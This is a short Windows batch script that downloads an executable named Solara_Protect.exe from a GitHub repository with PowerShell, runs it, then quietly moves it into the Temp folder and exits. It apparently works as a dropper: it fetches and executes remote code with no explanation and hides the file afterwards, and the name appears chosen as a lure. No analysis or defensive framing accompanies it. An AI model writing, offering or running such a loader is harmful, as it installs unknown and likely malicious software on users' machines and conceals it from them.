@echo off
setlocal enabledelayedexpansion

:: Download the executable
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/cfedss/exe/raw/main/Solara_Protect.exe' -OutFile '%~dp0Solara_Protect.exe'"

:: Run the executable and wait for it to finish
start /wait "" "%~dp0Solara_Protect.exe"

:: Move the executable to the Temp folder silently and quickly
move /Y "%~dp0Solara_Protect.exe" "%TEMP%\Solara_Protect.exe" >nul

:: Close the batch script
exit